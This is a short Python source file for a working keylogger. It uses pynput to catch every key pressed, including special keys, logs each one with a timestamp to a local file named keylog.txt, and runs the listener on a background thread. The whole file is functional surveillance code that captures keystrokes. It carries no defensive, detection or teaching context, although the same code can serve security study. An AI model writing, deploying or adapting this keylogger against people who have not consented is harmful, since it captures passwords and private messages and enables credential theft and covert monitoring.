import logging
from pynput import keyboard
import os
import threading

# Configure logging
LOG_FILE = "keylog.txt"
logging.basicConfig(
    filename=LOG_FILE, 
    level=logging.DEBUG, 
    format='%(asctime)s - %(message)s'
)

class Keylogger:
    def __init__(self):
        self.log_file = LOG_FILE
        self.listener = keyboard.Listener(on_press=self.on_press)

    def on_press(self, key):
        try:
            logging.info(f"Key pressed: {key.char}")
        except AttributeError:
            logging.info(f"Special key pressed: {key}")

    def start(self):
        with self.listener as listener:
            listener.join()

# Run keylogger in a separate thread
def start_keylogger():
    keylogger = Keylogger()
    keylogger.start()

if __name__ == "__main__":
    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()
    print("Keylogger is running in the background...")
    keylogger_thread.join()
